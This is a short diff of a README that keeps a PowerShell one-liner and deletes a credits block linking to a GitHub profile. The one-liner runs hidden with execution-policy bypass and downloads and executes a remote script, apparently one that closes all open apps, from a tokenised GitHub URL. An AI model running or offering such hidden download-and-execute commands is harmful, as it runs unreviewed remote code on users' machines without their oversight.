@@ -34,23 +34,3 @@ All
 ```powershell
 powershell -w h -ep bypass -Command  "iex (iwr -uri 'https://raw.githubusercontent.com/Zenin0/Glitter_Scripts/main/Windows/CloseAllApps/closeAllApps.ps1?token=GHSAT0AAAAAACJCV62V5JRTVENW2PIGRDAKZJVSH5A').Content"
 ```
-
-
-
-
-
-## Credits
-
-<h2 align="center"> Aleff :octocat: </h2>
-<div align=center>
-<table>
-  <tr>
-    <td align="center" width="96">
-      <a href="https://github.com/aleff-github">
-        <img src=https://github.com/aleff-github/aleff-github/blob/main/img/github.png?raw=true width="48" height="48" />
-      </a>
-      <br>Github
-    </td>
-  </tr>
-</table>
-</div>
